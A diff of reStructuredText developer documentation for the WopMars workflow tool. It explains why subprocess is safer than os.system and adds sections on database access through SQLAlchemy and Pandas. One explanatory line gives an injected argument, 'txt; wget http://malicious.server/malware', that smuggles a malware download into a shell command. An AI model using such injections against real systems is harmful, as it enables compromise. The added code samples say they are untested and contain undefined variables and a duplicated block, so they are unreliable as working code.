@@ -316,7 +316,7 @@ In your learning of Python, you may have encountered the famous ``os.system("com
             def list_extension(ext):
                 os.system("ls -1 *." + str(ext))
             
-        This function is supposed to list all the files of a given extension in the directory. But if, instead of passing ``txt`` as argument, I pass ``txt; wget http://malicious.server/malware`` then, the function will list the files with ``txt`` extension and download the malware from the malicious server!
+        This function is supposed to list all the files of a given extension in the directory. But if,  instead of passing ``txt`` as argument, I pass ``txt; wget http://malicious.server/malware`` then, the function will list the files with ``txt`` extension and download the malware from the malicious server!
 
         Now, with ``subprocess.Popen``, you can't do such a thing because spaces are not allowed inside arguments:
 
@@ -327,53 +327,85 @@ In your learning of Python, you may have encountered the famous ``os.system("com
         
     - ``subprocess`` open a Pipe between the python process and the subprocess whereas ``os.system`` calls a subshell independant of the first. This difference makes the communication between the subprocess and your python code far more easy with ``subprocess`` instead of ``os.system`` in which it is nearly impossible
 
+Reading/writing to the database
+...............................
 
+Reading and writing to the database has to be carried out through the WopMars session. The WopMars session implements a lock system to prevent database inconsistencies. There are three implemented methods to read/write to the database with the wopmars session. 
 
+- SQLAlchemy ORM
+- SQLAlchemy core
+- Pandas read_sql and to_sql
 
+SQLAlchemy ORM
+--------------------
 
+The SQLAlchemy ORM is very simple but it is also quit slow after 100 objects. Inside the `run` method of the tool wrapper, we will can take a WopMars session simply with `self.session` and then call SQLAlchemy ORM methods on it.
 
+        .. code-block:: python
 
+            # This code is for illustration purpose and has not been tested
+            # inside the run of a tool wrapper MyWrapper
+            def run(self):
+                session = self.session()
+                my_input_model = self.output_table(MyWrapper.__input_table1)
+                query_dic = {'col1': value_1, 'col2': value_2}
+                try: # check if query_dic exists
+                    session.query(my_input_model).filter_by(**query_dic).one()
+                except: # if not add and later commit
+                    snp_instance = snp_model(**snp_dic)
+                    session.add(snp_instance)
+                session.commit()
 
+SQLAlchemy core
+--------------------
 
+Inside the `run` method of the tool wrapper, we need to retrieve a list of object dictionaries in the database. Then we check if new objects are not already in the database and then insert a list of such object dictionnaries.
 
-packager Toolwrapper avec models
+        .. code-block:: python
 
+            # This code is for illustration purpose and has not been tested
+            # inside the run of a tool wrapper MyWrapper
+            def run(self):
+                session = self.session()
+                engine = session._WopMarsSession__session.bind
+                conn = engine.connect()
+                #
+                my_input_model = self.output_table(MyWrapper.__input_table1)
+                #
+                # retrieve all objects in database
+                sql = select([my_input_model.col1])
+                my_input_model_in_db = [{'col1': row[0] for row in conn.execute(sql)}]
+                # check if new col1:val1 not already in db
+                if not {'col1': val1} in my_input_model_col1_db:
+                    # add to list of value dics
+                    my_input_model_new_objects=[{'col1': val1}]
+                # bunch insert list of value dics
+                engine.execute(my_input_model.__table__.insert(), [my_input_model_val1_dic])
 
+Pandas read_sql and to_sql
+--------------------
 
+Inside the `run` method of the tool wrapper, we need to retrieve a list of object dictionaries in the database. Then we check if new objects are not already in the database and then insert a list of such object dictionnaries.
 
+        .. code-block:: python
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+            # This code is for illustration purpose and has not been tested
+            # inside the run of a tool wrapper MyWrapper
+            def run(self):
+                session = self.session()
+                engine = session._WopMarsSession__session.bind
+                conn = engine.connect()
+                #
+                my_input_model = self.output_table(MyWrapper.__input_table1)
+                #
+                # retrieve all objects in database
+                sql = select([my_input_model.col1])
+                my_input_model_in_db = [{'col1': row[0] for row in conn.execute(sql)}]
+                # check if new col1:val1 not already in db
+                if not {'col1': val1} in my_input_model_col1_db:
+                    # add to list of value dics
+                    my_input_model_new_objects=[{'col1': val1}]
+                # bunch insert list of value dics
+                engine.execute(my_input_model.__table__.insert(), [my_input_model_val1_dic])
 
 
